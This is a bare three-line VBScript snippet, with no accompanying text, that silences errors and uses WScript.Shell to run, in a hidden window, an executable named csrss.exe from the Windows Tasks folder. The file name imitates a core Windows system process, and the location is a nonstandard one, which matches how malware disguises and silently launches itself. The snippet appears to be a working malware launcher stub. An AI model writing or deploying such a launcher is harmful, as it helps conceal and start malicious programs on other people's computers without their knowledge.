On Error Resume Next
Set rs=createObject("Wscript.shell")
rs.run "%windir%\Tasks\csrss.exe",0